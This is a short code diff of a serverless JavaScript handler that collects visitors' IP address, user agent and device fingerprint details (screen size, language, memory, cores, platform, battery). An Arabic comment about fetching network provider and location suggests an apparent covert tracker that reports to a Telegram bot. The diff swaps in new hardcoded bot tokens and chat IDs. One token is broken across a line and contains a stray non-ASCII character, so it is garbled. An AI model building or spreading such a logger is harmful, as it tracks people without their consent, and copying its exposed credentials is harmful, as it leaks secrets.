@@ -2,8 +2,9 @@ export default async function handler(req, res) {
     const { res: screenRes, lang, mem, cores, plat, bat } = req.query;
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
-    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ";
-    const chatId = "5244299184";
+    const botToken = "8729528953:AAFgvdDG5uYit3LITzp5HuHx
+YPØLPXszCe0";
+    const chatId = "8665814266";
 
     try {
         // 1. جلب معلومات الشبكة (الشركة والموقع) - لا تحذف هذا الجزء
